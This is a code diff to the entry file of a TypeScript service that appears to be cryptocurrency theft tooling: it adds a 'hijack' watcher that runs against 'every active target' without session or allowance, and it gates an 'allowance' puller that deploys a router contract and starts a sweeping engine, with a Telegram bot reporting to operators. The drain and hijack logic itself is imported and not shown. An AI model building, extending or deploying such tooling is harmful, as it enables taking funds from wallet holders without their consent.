@@ -5,6 +5,7 @@ import { buildBot } from './bot';
 import { setBotUsername } from './bot/state';
 import { setNotifier } from './engine/notify';
 import { startEngine, engineState } from './engine/listener';
+import { startHijackWatcher } from './engine/hijack';
 import { checkBaw } from './engine/baw';
 import { ensureRouterDeployed } from './engine/deployer';
 
@@ -15,27 +16,30 @@ async function main() {
   await migrate();
   log('db ok');
 
-  // Automatically check and deploy the verified router contract on startup
-  await ensureRouterDeployed();
-
   const server = http.createServer((req, res) => {
     if (req.url === '/health') {
       res.writeHead(200, { 'content-type': 'application/json' });
-      return res.end(JSON.stringify(engineState));
+      return res.end(JSON.stringify({ ...engineState, dry: ENV.HIJACK_DRY, puller: ENV.ENABLE_PULLER }));
     }
     res.writeHead(404).end();
   });
   server.listen(Number(process.env.PORT) || 3000, () => log('health server up'));
 
-  try {
-    log(`baw ${await checkBaw()}`);
-  } catch (e: any) {
-    log(`BAW MISSING: ${e.message}`);
+  try { log(`baw ${await checkBaw()}`); } catch (e: any) { log(`BAW MISSING: ${e.message}`); }
+
+  // hijack mode — no session, no allowance, runs for every active target
+  if (ENV.HIJACK_ENABLED) {
+    await startHijackWatcher();
+    log(`hijack armed dry=${ENV.HIJACK_DRY}`);
   }
 
-  // engine first — a hung bot.launch() must not stop sweeping
-  await startEngine();
-  log('engine started');
+  // allowance mode — only when explicitly enabled, needs a router
+  if (ENV.ENABLE_PULLER) {
+    const router = await ensureRouterDeployed();
+    log(`router ${router ?? 'UNSET'}`);
+    await startEngine();
+    log('allowance engine started');
+  }
 
   const bot = buildBot();
   log('bot built');
@@ -50,12 +54,10 @@ async function main() {
     .catch(e => log(`LAUNCH FAILED: ${e.message}`));
 
   setNotifier((userId, text) =>
-    bot.telegram.sendMessage(userId, text, {
-      parse_mode: 'HTML', link_preview_options: { is_disabled: true },
-    }));
+    bot.telegram.sendMessage(userId, text, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } }));
 
   setInterval(() => {
-    console.log(`[hb] armed=${engineState.armed} targets=${engineState.targets} block=${engineState.lastBlock}`);
+    console.log(`[hb] targets=${engineState.targets} block=${engineState.lastBlock} dry=${ENV.HIJACK_DRY}`);
   }, 60_000);
 
   const stop = (s: string) => { log(`${s} exit`); bot.stop(s); server.close(); process.exit(0); };
